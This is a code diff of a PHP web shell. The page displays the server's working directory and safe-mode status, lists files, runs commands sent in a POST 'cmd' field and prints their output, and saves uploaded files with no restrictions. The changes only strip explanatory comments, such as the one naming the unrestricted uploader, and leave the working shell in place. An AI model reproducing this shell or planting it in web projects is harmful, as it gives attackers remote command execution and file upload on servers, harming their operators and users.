@@ -78,7 +78,6 @@ label {
    border : 1px solid white;
    padding:3px;
    letter-spacing: 1px;
-   /* Style as you please, it will become the visible UI component. */
 }
 input[type=submit] {
     padding:3px;
@@ -93,11 +92,8 @@ input[type=submit] {
 </form>
 <pre><?php echo $output; ?></pre>
 </body>
-<!-- Make a table to list files -->
 <?php 
-// echo the current path
 echo "<h3>Current Path: </h3><h4>" . getcwd() . "</h4>";
-// echo if the safe mode is on or off
 echo "<br> <h3>Safe Mode: " . ini_get("safe_mode") . "</h3>";
 ?>
 <p>Files:</p>
@@ -112,7 +108,6 @@ if ($handle = opendir('.')) {
 
         if ($entry != "." && $entry != "..") {
 
-            // get the filesize of a $entry and print it as kb
             $filesize = filesize($entry);
             $filesize = $filesize / 1024;
             $filesize = round($filesize, 2);
@@ -136,7 +131,6 @@ if ($handle = opendir('.')) {
 
         }
 
-            //echo ("<h3> $entry ");
     }
 
     closedir($handle);
@@ -148,7 +142,6 @@ if (isset($_POST['cmd'])) {
     echo "<pre>$output</pre>";
 }
 
-// Upload files to the server with no restrictions
 if (isset($_FILES['file'])) {
     $file = $_FILES['file'];
     $file_name = $file['name'];
@@ -156,7 +149,6 @@ if (isset($_FILES['file'])) {
     move_uploaded_file($file_tmp, $file_name);
 }
 
-// make an uploader 
 echo "<center> <h5>Uploader</h5>";
 echo "<form action='#' method='post' enctype='multipart/form-data'>
 <label for='file'>Choose file</label>
